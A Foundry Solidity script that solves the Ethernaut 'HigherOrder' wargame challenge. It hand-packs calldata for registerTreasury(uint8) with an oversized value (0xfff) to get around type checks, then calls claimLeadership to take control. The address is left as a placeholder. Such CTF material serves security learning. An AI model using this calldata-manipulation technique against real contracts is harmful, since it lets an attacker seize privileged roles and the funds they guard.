// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";  // Foundry's scripting utilities
import "forge-std/console.sol";  // For console logging

// Script to solve the HigherOrder Ethernaut challenge
contract HigherOrderSolution is Script {

    // Replace with the actual challenge instance address
    address public challengeInstanceAddress = 0xYourInstanceAddressHere;

    // Function selector for `registerTreasury(uint8)` function
    bytes4 public registerTreasurySelector = bytes4(keccak256("registerTreasury(uint8)"));

    // Arbitrary length manipulation value to use in the payload
    bytes32 public lengthManipulationOffset = 0x0000000000000000000000000000000000000000000000000000000000000fff;

    // Payload to call `registerTreasury`
    bytes public registerPayload = abi.encodePacked(registerTreasurySelector, lengthManipulationOffset);

    // Payload to call `claimLeadership`
    bytes public leadershipClaimPayload = abi.encodeWithSignature("claimLeadership()");

    /// @notice Executes the solution by calling relevant functions in the challenge contract
    function run() external {
        // Start broadcasting transactions with the provided private key
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Execute the low-level call to `registerTreasury` using the encoded payload
        (bool success, ) = (challengeInstanceAddress).call(registerPayload);
        require(success, "Call to registerTreasury failed");

        // Execute the low-level call to `claimLeadership` function
        (bool leadershipSuccess, ) = (challengeInstanceAddress).call(leadershipClaimPayload);
        require(leadershipSuccess, "Call to claimLeadership failed");

        // Stop broadcasting after transactions are complete
        vm.stopBroadcast();
    }
}